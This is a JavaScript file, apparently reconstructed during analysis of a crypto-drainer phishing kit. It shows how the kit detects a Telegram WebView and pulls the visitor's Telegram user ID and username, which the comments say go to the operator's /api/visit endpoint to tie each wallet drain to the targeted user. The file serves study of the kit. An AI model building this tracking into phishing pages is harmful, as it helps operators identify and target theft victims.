/**
 * Telegram WebApp detection and tgUser extraction.
 *
 * The kit checks for Telegram at two independent points:
 *
 *   1. window.TelegramWebviewProxy — set by Telegram's WebView when
 *      the page opens inside a Telegram mini-app or webview.
 *   2. navigator.userAgent containing the string "TelegramWebviewProxy"
 *      (some older/Android Telegram clients inject this into the UA).
 *
 * If either check passes the kit also reads window.Telegram?.WebApp?.initDataUnsafe
 * to extract the tgUser object (Telegram's pre-parsed launch data).
 * tgUser carries:
 *   .id        (number)   Telegram numeric user ID
 *   .username  (string)   Telegram @handle, may be absent
 *   .first_name / .last_name  (strings, unused by the kit)
 *
 * tgid and tgus are forwarded to POST /api/visit as query parameters
 * (see visit.js) so the operator can correlate a drain to the Telegram
 * user who was sent the link.
 *
 * String-table evidence:
 *   [175] "TelegramWebviewProxy"   — the proxy object name / UA fragment
 *   [1030] "https://web.telegram.org"  — also in the kit's allowlist (unused
 *                                        by the client side; likely origin check
 *                                        for the operator backend's CORS config)
 *
 * Constants evidence:
 *   "tgid"  — query param key (constants array)
 *   "tgus"  — query param key (constants array)
 *   "username" — tgUser field (constants array)
 *   "tgWebAppVersion" / "tgWebAppData" — Telegram.WebApp fields
 */

function isTelegramWebView() {
  // Check 1: Telegram injects a global proxy object in its WebView
  if (typeof window.TelegramWebviewProxy !== "undefined") return true;
  // Check 2: older Telegram Android clients add the name to the UA string
  if (navigator.userAgent.includes("TelegramWebviewProxy")) return true;
  return false;
}

function getTelegramUser() {
  try {
    const tg = window.Telegram?.WebApp;
    if (!tg) return undefined;
    // initDataUnsafe is Telegram's pre-parsed launch-parameter dict.
    // The kit only reads .user from it.
    return tg.initDataUnsafe?.user ?? undefined;
  } catch {
    return undefined;
  }
}

/**
 * Combined check used at page load:
 *
 *   const tgUser = getTelegramContext();
 *   if (tgUser) sendVisit(state, tgUser);  // see visit.js
 *
 * Returns the tgUser object (or undefined) so visit.js can attach
 * tgid/tgus to POST /api/visit.
 */
function getTelegramContext() {
  if (!isTelegramWebView()) return undefined;
  return getTelegramUser(); // may still be undefined if WebApp not available
}
